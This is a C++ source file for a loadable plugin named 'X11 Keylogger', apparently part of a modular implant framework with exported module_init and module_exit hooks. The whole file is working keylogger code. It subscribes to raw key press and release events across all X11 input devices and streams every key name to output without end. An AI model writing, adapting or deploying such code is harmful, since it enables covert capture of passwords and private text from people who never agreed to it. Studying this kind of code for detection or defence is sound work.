#include <X11/XKBlib.h>
#include <X11/extensions/XInput2.h>

#include <cstring>

#include <dirent.h>
#include <filesystem>
#include <iostream>
#include <string>
#include <vector>

#include "plugin_base.hpp"

class Keylogger : public AbstractPlugin
{
public:
    Keylogger() {}
    ~Keylogger() {}
    virtual int load() { return 0; }
    virtual int unload() { return 0; }
    virtual std::string name() { return std::string("X11 Keylogger"); }
    virtual std::string run(const std::string& parameter = "")
    {
        const char * hostname    = ":0";

        // Set up X
        Display * disp = XOpenDisplay(hostname);
        if (NULL == disp)
        {
            std::cerr << "Cannot open X display: " << hostname << std::endl;
            exit(1);
        }

        // Test for XInput 2 extension
        int xiOpcode, queryEvent, queryError;
        if (! XQueryExtension(disp, "XInputExtension", &xiOpcode, &queryEvent, &queryError)) 
        {
            std::cerr << "X Input extension not available" << std::endl;
            exit(2);
        }
        { // Request XInput 2.0, guarding against changes in future versions
            int major = 2, minor = 0;
            int queryResult = XIQueryVersion(disp, &major, &minor);
            if (queryResult == BadRequest) 
            {
                std::cerr << "Need XI 2.0 support (got " << major << "." << minor << std::endl;
                exit(3);
            }
            else if (queryResult != Success) 
            {
                std::cerr << "Internal error" << std::endl;
                exit(4);
            }
        }

        // Register events
        Window root = DefaultRootWindow(disp);
        
        XIEventMask m;
        m.deviceid = XIAllMasterDevices;
        m.mask_len = XIMaskLen(XI_LASTEVENT);
        m.mask = (unsigned char*)calloc(m.mask_len, sizeof(char));
        XISetMask(m.mask, XI_RawKeyPress);
        XISetMask(m.mask, XI_RawKeyRelease);
        
        XISelectEvents(disp, root, &m, 1);
        XSync(disp, false);
        free(m.mask);

        while (true) 
        {
            XEvent event;
            XGenericEventCookie *cookie = (XGenericEventCookie*)&event.xcookie;
            XNextEvent(disp, &event);

            if (XGetEventData(disp, cookie) &&
                    cookie->type == GenericEvent &&
                    cookie->extension == xiOpcode) 
            {
                switch (cookie->evtype)
                {
                    case XI_RawKeyRelease:
                    case XI_RawKeyPress: 
                    {
                        XIRawEvent *ev = (XIRawEvent*)cookie->data;

                        // Ask X what it calls that key
                        KeySym s = XkbKeycodeToKeysym(disp, ev->detail, 0, 0);
                        if (NoSymbol == s) continue;
                        char *str = XKeysymToString(s);
                        if (NULL == str) continue;

                        std::cout << (cookie->evtype == XI_RawKeyPress ? "+" : "-") << str << " " << std::flush;
                        break;
                    }
                }
            }
        }
        return std::string("");
    }
};

extern "C"
{
void* module_init()
{
    Keylogger *obj = new Keylogger();
    return reinterpret_cast<void*>(obj);
}

void module_exit(void* ptr)
{
    if (ptr)
        delete reinterpret_cast<Keylogger*>(ptr);
}
}
